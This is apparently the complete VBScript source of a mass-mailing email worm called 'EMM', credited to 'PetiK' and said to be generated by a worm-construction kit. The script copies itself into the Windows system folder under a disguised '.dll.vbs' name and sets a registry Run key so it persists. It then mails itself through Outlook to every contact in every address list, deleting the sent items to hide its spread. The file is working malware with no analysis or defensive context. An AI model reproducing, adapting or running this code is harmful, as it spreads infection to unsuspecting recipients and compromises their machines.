'Name of the worm : EMM
'Author : PetiK
On Error Resume Next

Set gvmjpgmd=CreateObject("Scripting.FileSystemObject")
Set dspmsjpg=CreateObject("WScript.Shell")
Set cpy=gvmjpgmd.GetFile(WScript.ScriptFullName)
cpy.Copy(gvmjpgmd.GetSpecialFolder(1)&"\emm.dll.vbs")
r=("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\emm")
dspmsjpg.RegWrite r,(gvmjpgmd.GetSpecialFolder(1)&"\emm.dll.vbs")

Set gmdjapms=CreateObject("Outlook.Application")
Set sjgmmdja=gmdjapms.GetNameSpace("MAPI")
For Each C In sjgmmdja.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set apmsjgmm=C.AddressEntries(D)
Set mdjapmsj=gmdjapms.CreateItem(0)
mdjapmsj.To=apmsjgmm.Address
mdjapmsj.Subject="Subject of the message"
mdjapmsj.Body="The body of the message"
mdjapmsj.Attachments.Add(gvmjpgmd.GetSpecialFolder(1)&"\emm.dll.vbs")
mdjapmsj.DeleteAfterSubmit=True
If mdjapmsj.To <> "" Then
mdjapmsj.Send
End If
Next
End If
Next


'This worm was generated by the tool PSWG 1.0
